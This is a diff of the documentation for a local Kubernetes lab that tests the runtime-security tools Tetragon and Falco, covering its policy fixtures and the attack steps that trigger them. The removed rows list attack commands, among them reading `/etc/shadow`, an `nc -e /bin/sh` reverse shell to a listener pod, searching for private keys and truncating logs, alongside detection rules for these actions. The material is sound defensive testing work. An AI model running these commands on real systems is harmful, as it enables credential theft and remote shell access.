@@ -4,10 +4,11 @@ The `tetragon` and `falco` components install the two runtime security tools of 
 
 | Item | File | Description |
 | --- | --- | --- |
-| `tetragon` | `gitops/infrastructure/tetragon/sources/` | Umbrella chart for Tetragon, its detection policies and its enforcement policies |
-| `falco` | `gitops/infrastructure/falco/sources/` | Umbrella chart for Falco and its local rules |
+| `tetragon` | `gitops/infrastructure/tetragon/sources/` | Umbrella chart for Tetragon. No lab policies. |
+| `falco` | `gitops/infrastructure/falco/sources/` | Umbrella chart for Falco. No lab rules. |
 | Kind values | `gitops/clusters/kind-local/values/tetragon.yaml` | The values of Tetragon for `kind-local` only |
-| Attack set | `.mise/tasks/security/attack-set.sh`, `tests/runtime-security/` | The task that runs the attack steps, and the manifests of the lab pods |
+| Attack set | `.mise/tasks/security/attack-set.sh` | The task that runs the attack steps |
+| Lab fixtures | `tests/runtime-security/` | The lab pods, the Tetragon lab policies and the Falco lab rules. Refer to [Lab fixtures](#lab-fixtures). |
 | Measurement | `.mise/tasks/security/measure.sh` | The task that samples the memory, the CPU and the event volume |
 
 The syntax of the `security:*` tasks is in [Mise tasks](mise-tasks.md).
@@ -95,63 +96,39 @@ The component owns the CRDs `tracingpolicies.cilium.io`, `tracingpoliciesnamespa
 | `collectors.kubernetes.enabled` | `false`. No k8s-metacollector. The container plugin reads the CRI socket. |
 | `collectors.containerEngine.engines` | `containerd` and `cri` on. `docker`, `podman`, `lxc`, `libvirt_lxc` and `bpm` off. |
 | `falcoctl.artifact.install.enabled`, `falcoctl.artifact.follow.enabled` | `false`. No `falcoctl` container. The rules and the plugin come from the image. |
-| `customRules` | The local rules. Refer to [Falco local rules](#falco-local-rules). |
 | `metrics.enabled`, `falco.webserver.prometheus_metrics_enabled` | `true`. Port 8765. |
 | Resources | Refer to [Footprint](#footprint). |
 
-## Tetragon policies
+## Lab fixtures
 
-All the policies of the component are `TracingPolicyNamespaced` objects in the namespace `rtsec-lab`. The component has no cluster-scoped `TracingPolicy` with an action.
+The `tetragon` and `falco` components hold only the tools. They have no `TracingPolicy`, no `TracingPolicyNamespaced` and no local Falco rule for the lab. The lab objects are test fixtures in `tests/runtime-security/`. Argo CD does not sync them.
 
-| Policy | Hook | Selector | Action |
+| Fixture | Content | Applied | Deleted |
 | --- | --- | --- | --- |
-| File read | `security_file_permission` | Path prefix `/etc/shadow`, `MAY_READ` | Event only |
-| File create below `/etc` | `security_path_mknod` | Dentry prefix `/etc` | Event only |
-| Log truncate | `security_file_truncate` | Files below `/var/log` | Event only |
-| API server connect | `tcp_connect` | The API server endpoint: the node IPs, port 6443 | Event only |
-| Lab connect | `tcp_connect` | The listener pod, port 4444 | Event only |
-| User namespace | `create_user_ns` | None | Event only |
-| Ptrace | `sys_ptrace` (`__arm64_sys_ptrace` on arm64) | None | Event only |
-| E1 | `security_file_permission` | Path prefix `/etc/shadow`, `MAY_READ` | `Sigkill` |
-| E2 | `security_socket_connect` | The listener port 4444 | `Override`, `argError: -1` |
-| E3 | `security_path_mknod` | Dentry prefix `/etc` | `Override`, `argError: -1` |
+| Lab pods | The pods of the attack steps, and the pod `enforce-target` with the label `rtsec.gsuquet.com/role: enforce` | At the start of the run | With `rtsec-lab` |
+| Tetragon detection policies | `TracingPolicyNamespaced` objects in `rtsec-lab`, with the action `Post` only | For the full run | With `rtsec-lab` |
+| Tetragon enforcement policies | `TracingPolicyNamespaced` objects in `rtsec-lab`, with a `podSelector` on `rtsec.gsuquet.com/role: enforce` | For the E steps only | After the E steps, and with `rtsec-lab` |
+| Falco local rules | The local rules for the lab steps that the stable rule set does not cover, for example the API server endpoint | For the full run | At the end of the run |
 
-The sources of the policies are the Tetragon [policy library](https://tetragon.io/docs/policy-library/observability/) and the [examples of v1.8.0](https://github.com/cilium/tetragon/tree/v1.8.0/examples).
+The sources of the Tetragon policies are the Tetragon [policy library](https://tetragon.io/docs/policy-library/observability/) and the [examples of v1.8.0](https://github.com/cilium/tetragon/tree/v1.8.0/examples).
 
-## Falco local rules
+The enforcement policies act only on the pod `enforce-target`:
 
-`customRules` adds these rules to the stable rule set of the image:
+| ID | Hook | Selector | Action | Result |
+| --- | --- | --- | --- | --- |
+| E1 | `security_file_permission` | Path prefix `/etc/shadow`, `MAY_READ` | `Sigkill` | Exit status 137, action `KPROBE_ACTION_SIGKILL` |
+| E2 | `security_socket_connect` | The listener port 4444 | `Override`, `argError: -1` | `Operation not permitted`. The process continues. |
+| E3 | `security_path_mknod` | Dentry prefix `/etc` | `Override`, `argError: -1` | `Operation not permitted`. No file. |
 
-| Rule | Condition |
-| --- | --- |
-| `Write below etc` | A process in a container opens a file below `/etc` for a write. From the [Falco quickstart](https://falco.org/docs/getting-started/falco-kubernetes-quickstart/). |
-| API server endpoint | A connection from a container to a node IP on port 6443 (`fd.sport=6443`) |
+Falco has no enforcement. For the E steps, the summary records "detect only" for Falco.
 
 ## Attack set
 
-The `security:attack-set` task runs these steps in the pod `target` of the namespace `rtsec-lab`. The table gives the Falco rule and the Tetragon signal of each step.
+The attack steps come from [falcosecurity/event-generator](https://github.com/falcosecurity/event-generator), the test tool of the Falco project. The task pins its image by the digest. The repository has no attack code of its own. A step that `event-generator` does not cover is not in the set, or it is a plain shell command.
 
-| ID | Step | Falco rule | Tetragon signal |
-| --- | --- | --- | --- |
-| A1 | Shell with a TTY: `id` | `Terminal shell in container` | `process_exec` of `/bin/sh`. The event has no TTY field. |
-| A2 | `cat /etc/shadow` | `Read sensitive file untrusted` | File read policy |
-| A3 | `touch /etc/rtsec-<run-id>` | `Write below etc` (local) | File create policy |
-| A4 | Copy of busybox to `/tmp/<run-id>/true`, then its execution | `Drop and execute new binary in container` | `process_exec` of a binary below `/tmp/` |
-| A5 | The same below `/dev/shm/<run-id>/` | `Execution from /dev/shm` | `process_exec` of a binary below `/dev/shm/` |
-| A6 | Fileless execution through `memfd_create` (lab helper) | `Fileless execution via memfd_create` | `process_exec` of `/proc/self/fd/<n>`, with `binary_properties.file.inode.links: 0` |
-| A7 | `wget` to `https://kubernetes.default.svc/version` | API server endpoint (local) | API server connect policy |
-| A8 | `nc listener 4444 -e /bin/sh` | `Netcat Remote Code Execution in Container`, `Redirect STDOUT/STDIN to Network Connection in Container` | `process_exec` of `nc` with `-e /bin/sh`, and the lab connect policy |
-| A9 | `grep -r "BEGIN RSA PRIVATE" /etc` | `Search Private Keys or Passwords` | `process_exec` with its arguments |
-| A10 | Truncate of a file below `/var/log` | `Clear Log Activities` | Log truncate policy |
-| A11 | `unshare -U true` | None in the stable rule set | User namespace policy |
-| A12 | `PTRACE_ATTACH` of the lab helper on its own child | `PTRACE attached to process` | Ptrace policy |
-| E1 | `cat /etc/shadow` | None. Falco does not enforce. | `Sigkill`: exit status 137, action `KPROBE_ACTION_SIGKILL` |
-| E2 | Connection to the listener on port 4444 | None | `Override`: `Operation not permitted`, the process continues |
-| E3 | Create of a file below `/etc` | None | `Override`: `Operation not permitted`, no file |
+The `security:attack-set` task obeys these limits:
 
-The task obeys these limits:
-
-- It runs only when the kubeconfig context is `kind-kind-local`.
+- It runs only when the kubeconfig context is `kind-kind-local` and the server URL of the context is on `127.0.0.1`.
 - It creates `rtsec-lab` with the Pod Security level `baseline`, outside GitOps, and it deletes the namespace at the end.
 - No step leaves `rtsec-lab`, needs a capability above the runtime default, touches a host path or connects to the internet.
 - It writes the run ID in an annotation of `rtsec-lab` and in each command line.
